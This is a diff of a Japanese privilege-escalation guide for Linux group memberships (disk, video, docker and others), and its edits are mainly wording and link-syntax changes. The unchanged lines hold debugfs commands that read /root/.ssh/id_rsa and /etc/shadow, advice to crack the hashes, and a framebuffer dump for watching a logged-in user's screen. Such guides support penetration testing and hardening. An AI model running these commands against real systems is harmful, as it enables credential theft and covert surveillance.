@@ -69,13 +69,13 @@ sudo su
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-そうですね、ファイルを読んでいくつかの**ハッシュをクラッキング**してみてください。
+そうですね、ファイルを読んで**ハッシュをいくつかクラッキング**してみましょう。
 
 # ディスクグループ
 
 この特権はほぼ**ルートアクセスと同等**であり、マシン内のすべてのデータにアクセスできます。
 
-ファイル: `/dev/sd[a-z][1-9]`
+ファイル:`/dev/sd[a-z][1-9]`
 ```text
 debugfs /dev/sda1
 debugfs: cd /root
@@ -83,7 +83,7 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-注意として、debugfsを使用すると**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
+注意してほしいのは、debugfsを使用すると**ファイルを書き込む**こともできるということです。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
@@ -100,7 +100,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。
 
-**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。それを行うためには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存され、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
+**video group**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -125,9 +125,13 @@ find / -group root -perm -g=w 2>/dev/null
 
 ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。インスタンスが起動すると、そのボリュームに`chroot`を即座にロードします。これにより、実質的にマシン上でroot権限を得ることができます。
 
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+{{#ref}}
+https://github.com/KrustyHack/docker-privilege-escalation
+{{#endref}}
 
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+{{#ref}}
+https://fosterelli.co/privilege-escalation-via-docker.html
+{{#endref}}
 
 # lxc/lxdグループ
 
